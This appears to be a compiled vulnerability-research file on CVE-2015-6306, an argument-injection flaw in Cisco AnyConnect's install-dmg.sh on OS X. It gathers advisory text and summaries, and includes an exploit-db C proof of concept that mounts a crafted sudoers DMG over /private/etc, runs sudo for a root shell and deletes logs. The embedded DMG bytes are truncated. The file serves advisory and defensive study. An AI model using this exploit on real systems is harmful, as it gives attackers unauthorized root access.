```
 Guidelines:
 1. First verify if the content relates to the CVE specified based on the official description
 2. If the content does not relate to this CVE, respond with "UNRELATED"
 3. If no useful vulnerability information is found, respond with "NOINFO"
 4. For relevant content, extract:
    - Root cause of vulnerability
    - Weaknesses/vulnerabilities present
    - Impact of exploitation
    - Attack vectors
    - Required attacker capabilities/position
 
 Additional instructions:
 - Preserve original technical details and descriptions
 - Remove unrelated content
 - Translate non-English content to English
 - Note if the content provides more detail than the official CVE description
 ```
 
 ### Content from seclists.org_7a812206_20250125_213305.html
 
 ```
 Cisco AnyConnect elevation of privileges via DMG install script
 ------------------------------------------------------------------------
 Yorick Koster, July 2015
 
 ------------------------------------------------------------------------
 Abstract
 ------------------------------------------------------------------------
 Cisco AnyConnect Secure Mobility Client for OS X is affected by a
 vulnerability that allows local attackers to mount arbitrary DMG files
 at arbitrary mount points. By exploiting this vulnerability is is
 possible for the attacker to gain root privileges. Cisco reports that a
 similar issue also exists in Cisco AnyConnect Secure Mobility Client for
 Linux.
 
 ------------------------------------------------------------------------
 See also
 ------------------------------------------------------------------------
 - CVE-2015-6306
 - <http://tools.cisco.com/security/center/viewAlert.x?alertId=41135>
 
 ------------------------------------------------------------------------
 Tested version
 ------------------------------------------------------------------------
 This issue was successfully verified on Cisco AnyConnect Secure Mobility
 Client for OS X version 3.1.08009.
 
 ------------------------------------------------------------------------
 Fix
 ------------------------------------------------------------------------
 There is currently no fix available. Updates are expected to be released
 on September 30, 2015.
 
 Cisco has released bug ID CSCuv11947 for registered users, which
 contains additional details and an up-to-date list of affected product
 versions.
 
 ------------------------------------------------------------------------
 Details
 ------------------------------------------------------------------------
 <https://www.securify.nl/advisory/SFY20150701/cisco_anyconnect_elevation_of_privileges_via_dmg_install_script.html>
 ```
 
 *   **Root cause of vulnerability:** The `hdiutil attach` command within the `install-dmg.sh` script is vulnerable to argument injection due to unsanitized user input, allowing arbitrary mount points.
 *   **Weaknesses/vulnerabilities present:**  Unsanitized user-supplied input in the `${DMG}` variable, leading to command injection in `hdiutil attach`, thus allowing mounting of arbitrary DMG files at arbitrary mount points.
 *  **Impact of exploitation:** A local attacker can gain root privileges by mounting a specially crafted DMG file that contains files to overwrite sensitive system configurations.
 *   **Attack vectors:** A local attacker crafts a malicious DMG file and sends a crafted command to the AnyConnect system service to mount it using the vulnerable `install-dmg.sh` script.
 *   **Required attacker capabilities/position:** The attacker needs to be a local user on the target machine.
 
 ### Content from www.exploit-db.com_6b1aa724_20250125_213311.html
 
 ```
 # Cisco AnyConnect 3.1.08009 - Local Privilege Escalation (via DMG Install Script)
 
 #### EDB-ID:
 
 ###### 38303
 
 #### CVE:
 
 ###### [2015-6306](https://nvd.nist.gov/vuln/detail/CVE-2015-6306)
 
 ---
 
 **EDB Verified:**
 
 #### Author:
 
 ###### [Yorick Koster](/?author=7189)
 
 #### Type:
 
 ###### [local](/?type=local)
 
 ---
 
 #### Platform:
 
 ###### [OSX](/?platform=osx)
 
 #### Date:
 
 ###### 2015-09-23
 
 ---
 
 **Vulnerable App:**
 
 ```c
 /* Cisco AnyConnect elevation of privileges via DMG install script - proof of concept
    Yorick Koster, July 2015
    https://securify.nl/advisory/SFY20150701/cisco_anyconnect_elevation_of_privileges_via_dmg_install_script.html
    based on http://expertmiami.blogspot.com/2015/06/cisco-anyconnect-secure-mobility-client.html
 */
 #include <stdio.h>
 #include <fcntl.h>
 #include <stdlib.h>
 #include <strings.h>
 #include <unistd.h>
 #include <arpa/inet.h>
 #include <uuid/uuid.h>
 
 #define DMG_PATH   "/private/tmp/sudoers.dmg"
 #define MOUNT_POINT   "/private/etc"
 #define EXEC_PATH   "/opt/cisco/anyconnect/bin/vpndownloader.app/Contents/Resources/install-dmg.sh"
 #define EXEC_ARGS   DMG_PATH " -owners on -mountpoint " MOUNT_POINT
 #define CMD_TO_EXEC   "sudo -s -- 'hdiutil eject -force /private/etc;rm -rf /private/tmp/[0-9]*.log;su -'"
 
 extern unsigned char _private_tmp_sudoers_dmg[];
 unsigned int _private_tmp_sudoers_dmg_len = 27052;
 
 int main(int argc, char *argv[], char *envp[])
 {
    char *path = EXEC_PATH;
    char *args = EXEC_ARGS;
    int fd;
    int sockfd;
    struct sockaddr_in servaddr;
    char *buf;
    unsigned int len;
    unsigned int offset = 0;
    uuid_t uuid;
 
    if((fd =creat(DMG_PATH, 0644)) == -1)
    {
       perror("creat");
       return 1;
    }
 
    if(write(fd, _private_tmp_sudoers_dmg, _private_tmp_sudoers_dmg_len) != _private_tmp_sudoers_dmg_len)
    {
       perror("write");
       close(fd);
       unlink(DMG_PATH);
       return 2;
    }
 
    close(fd);
 
    len = 10 + strlen(path) + strlen(args);
    if((buf = (char *)malloc(len + 26)) == NULL)
    {
       perror("malloc");
       unlink(DMG_PATH);
       return 3;
    }
 
    /* header */
    buf[0] = 0x4f;
    buf[1] = 0x43;
    buf[2] = 0x53;
    buf[3] = 0x43;
    buf[4] = 0x1a;
    buf[5] = 0x00;
    buf[6] = len & 0xFF;
    buf[7] = (len >> 8) & 0xFF;
    uuid_generate(uuid);
    memcpy(buf + 8, uuid, 16);
    offset = 24;
    buf[offset] = 0x01;
    buf[offset + 1] = 0x02;
 
    /* path */
    buf[offset + 2] = 0x00;
    buf[offset + 3] = 0x01;
    buf[offset + 4] = 0x00;
    buf[offset + 5] = (strlen(path) & 0xFF) + 1;
    offset += 6;
    memcpy(buf + offset, path, strlen(path) + 1);
    offset += strlen(path) + 1;
 
    /* args */
    buf[offset] = 0x00;
    buf[offset + 1] = 0x02;
    buf[offset + 2] = 0x00;
    buf[offset + 3] = (strlen(args) & 0xFF) + 1;
    offset += 4;
    memcpy(buf + offset, args, strlen(args) + 1);
 
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    bzero(&servaddr, sizeof(servaddr));
    servaddr.sin_family = AF_INET;
    servaddr.sin_addr.s_addr = inet_addr("127.0.0.1");
    servaddr.sin_port = htons(29754);
 
    if(connect(sockfd, (struct sockaddr *)&servaddr, sizeof(servaddr)) == -1)
    {
       perror("connect");
       unlink(DMG_PATH);
       free(buf);
       return 4;
    }
 
    if(write(sockfd, buf, len + 26) == -1)
    {
       perror("write");
       unlink(DMG_PATH);
       free(buf);
       return 5;
    }
 
    close(sockfd);
    sleep(5); // arbitrary sleep
    system(CMD_TO_EXEC);
    unlink(DMG_PATH);
    free(buf);
    return 0;
 }
 
 unsigned char _private_tmp_sudoers_dmg[] = {
 0x78, 0x01, 0xed, 0xd0, 0x41, 0x0a, 0x01, 0x01, 0x18, 0x05, 0xe0, 0x57,
 0x4e, 0x30, 0x3b, 0x4b, 0x4b, 0x4b, 0xce, 0x40, 0x28, 0x4b, 0x17, 0x18,
 ... (truncated) ...
 ```
 
 *   **Root cause of vulnerability:**  The `install-dmg.sh` script is vulnerable to argument injection through the DMG path, allowing an attacker to mount a malicious DMG at an arbitrary location.
 *   **Weaknesses/vulnerabilities present:** The primary vulnerability is the injection flaw in the `hdiutil attach` command.  The script takes user-controlled input and passes it without sanitization to `hdiutil attach`, leading to arbitrary mount point specification.
 *   **Impact of exploitation:** Successful exploitation allows an unprivileged local attacker to escalate to root privileges by mounting a crafted DMG file that overwrites the `/etc/sudoers` file.
 *   **Attack vectors:** The attacker crafts a malicious DMG file, then crafts a message to the AnyConnect service to call the `install-dmg.sh` script using the specially crafted DMG path argument with the malicious DMG. The `install-dmg.sh` script, when invoked by AnyConnect service, mounts the DMG file using `hdiutil`, then the attacker executes sudo command with the changed sudoers permissions.
 *   **Required attacker capabilities/position:** The attacker must be a local user able to communicate with the AnyConnect service and also needs local file creation access.
 
 ### Content from www.securify.nl_a3f1202f_20250125_213312.html
 
 ```
 # Cisco AnyConnect elevation of privileges via DMG install script
 
 #### Spring naar
 
 * [Abstract](/advisory/cisco-anyconnect-elevation-of-privileges-via-dmg-install-script/#abstract)
 * [See also](/advisory/cisco-anyconnect-elevation-of-privileges-via-dmg-install-script/#see-also)
 * [Tested version](/advisory/cisco-anyconnect-elevation-of-privileges-via-dmg-install-script/#tested-version)
 * [Fix](/advisory/cisco-anyconnect-elevation-of-privileges-via-dmg-install-script/#fix)
 * [Introduction](/advisory/cisco-anyconnect-elevation-of-privileges-via-dmg-install-script/#introduction)
 * [Vulnerability details](/advisory/cisco-anyconnect-elevation-of-privileges-via-dmg-install-script/#vulnerability-details)
 * [Proof of concept](/advisory/cisco-anyconnect-elevation-of-privileges-via-dmg-install-script/#proof-of-concept)
 ## Abstract
 
 Cisco AnyConnect Secure Mobility Client for OS X is affected by a vulnerability that allows local attackers to mount arbitrary DMG files at arbitrary mount points. By exploiting this vulnerability is is possible for the attacker to gain `root` privileges. Cisco reports that a similar issue also exists in Cisco AnyConnect Secure Mobility Client for Linux.
 
 ## See also
 
 * [CVE-2015-6306](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-6306)
 * [Security Alert 41135](http://tools.cisco.com/security/center/viewAlert.x?alertId=41135): Cisco AnyConnect Secure Mobility Client for Linux and Mac OS X Privilege Escalation Vulnerability
 
 ## Tested version
 
 This issue was successfully verified on Cisco AnyConnect Secure Mobility Client for OS X version 3.1.08009.
 
 ## Fix
 
 Cisco customers with active contracts can obtain updates through the Software Center at <https://software.cisco.com/download/navigator.html>.
 
 Cisco has released bug ID [CSCuv11947](https://tools.cisco.com/bugsearch/bug/CSCuv11947) for registered users, which contains additional details and an up-to-date list of affected product versions.
 
 ## Introduction
 
 Last June, a [blog post](http://expertmiami.blogspot.nl/2015/06/cisco-anyconnect-secure-mobility-client.html) was published by [Kostya Kortchinsky](https://twitter.com/crypt0ad) detailing an elevation of privileges vulnerability in Cisco AnyConnect Secure Mobility Client for Windows. This vulnerability allowed an unprivileged user to invoke any binary signed by Cisco, which would be executed with `SYSTEM` privileges. This could be abused to install an arbitrary interactive service and consequently granting a local user `SYSTEM` privileges.
 
 It was found that the OS X version of AnyConnect is affected by a similar vulnerability. On OS X it is possible for a local unprivileged user to gain `root` privileges. Cisco reports that a similar issue also exists in Cisco AnyConnect Secure Mobility Client for Linux.
 
 ## Vulnerability details
 
 Cisco AnyConnect comes with a system service listening on the loopback interface. It allows for local processes to connect to it and send commands to it. One command is interesting as it can be used to invoke executables with elevated privileges. AnyConnect restricts which executables can be invoked to prevent a local attacker from gaining elevated privileges.
 
 One of the executables that can be invoked is `install-dmg.sh`, which is located in `/opt/cisco/anyconnect/bin/vpndownloader.app/Contents/Resources/`. This script allows a `PKG` file, located in a `DMG` file, to be installed as `root`. `PKG` files are only installed if they are named:
 
 * `vpn.pkg`
 * `posture.pkg`
 * `dart.pkg`
 * `websecurity.pkg`
 
 In theory an attacker could create a `DMG` file containing a specially crafted `PKG` file that can be installed via AnyConnect. However, the script appears to be broken. After the `DMG` file is mounted, its path is supplied to the `installer` program. The path is however prepended with a new-line character that cause `installer` to throw an error - instead of installing the `PKG` file.
 
 The command for mounting the `DMG` contains a flaw, which still allows a local attacker to abuse the script and gain `root` privileges. The flaw exists in the following command:
 
 ```
 HDIDOUT=`hdiutil attach **${DMG}** -nobrowse` || exit 1
 
 ```
 
 The `${DMG}` variable contains user-supplied input. Using a space character it is possible to add extra arguments to the `hdiutil attach` command. Consequently an attacker can mount a `DMG` file at an arbitrary mount point. Due to this it is possible to change the system's configuration and gain `root` privileges.
 
 ## Proof of concept
 
 The following proof of concept will start a `root` shell on an affected system using the following steps:
 
 * create a `DMG` file containing a `sudoers` file that allows anyone in the `everyone` group to invoke `sudo` without providing a password.
 * execute `install-dmg.sh` with the `DMG` file as argument.
 * abuse the `hdiutil attach` flaw to mount the DMG file to `/private/etc`
 * execute `sudo` to gain `root` privileges.
 
 [anyconnect-eop-install-dmg.c](https://www.datocms-assets.com/21957/1592984219-anyconnect-eop-install-dmg.c)
 ```
 
 *   **Root cause of vulnerability:** The vulnerability is due to a command injection in the `hdiutil attach` command within the `install-dmg.sh` script due to the use of user-supplied input without proper sanitization.
 *   **Weaknesses/vulnerabilities present:** The main vulnerability lies in the lack of sanitization of the `${DMG}` variable when supplied to the `hdiutil attach` command which allows arbitrary arguments to be injected.
 *   **Impact of exploitation:**  A local, unprivileged user can gain root privileges by exploiting the command injection to mount a malicious DMG file at an arbitrary location, thus being able to modify sensitive system files and execute commands as root.
 *   **Attack vectors:** The attack vector involves crafting a malicious DMG, then using the vulnerable command injection point within `install-dmg.sh` to mount the crafted DMG on a sensitive location, and exploiting that to execute commands as root.
 *  **Required attacker capabilities/position:** The attacker needs to be a local user able to interact with the AnyConnect system service and craft a malicious DMG file.
 
 ### Content from tools.cisco.com_e512bb2e_20250125_213309.html
 
 This content provides information regarding Cisco's policy on publishing security alerts, and points to external resources for third-party vulnerability information. It is not specific to CVE-2015-6306.
 
 **Response:** UNRELATED
 
 ### Content from packetstormsecurity.com_d9c54c43_20250125_213303.html
 
 This content is a generic page from Packet Storm Security. No specific information related to the CVE is provided.
 
 **Response:** NOINFO
 ```